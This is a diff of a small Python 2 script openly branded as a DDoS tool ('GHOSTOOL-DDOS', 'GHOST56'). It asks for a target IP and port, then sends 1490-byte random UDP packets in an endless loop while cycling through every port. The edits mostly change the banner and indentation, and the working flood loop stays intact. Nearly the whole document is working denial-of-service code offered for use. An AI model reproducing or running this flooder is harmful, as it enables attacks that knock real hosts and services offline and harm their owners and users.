@@ -12,18 +12,17 @@ day = now.day
 month = now.month
 year = now.year
 
-
-#############
+##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet DDOS")
+os.system("figlet GHOSTOOL-DDOS")
 
-print
+print "##################################"
 print "----------*GHOST56*---------------"
-print
+print "##################################"
 
 ip = raw_input("TARGET IP: ")
 port = input  ("PORT     : ")
@@ -38,9 +37,9 @@ time.sleep(2)
 
 sent = 0
 while True:
-    sock.sendto(bytes, (ip,port))
-    sent = sent + 1
-    port = port + 1
-    print "Sent %s packet to %s throught Port"%(sent,ip)
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught Port"%(sent,ip)
      if port == 65534:
-     port = 1
+       port = 1
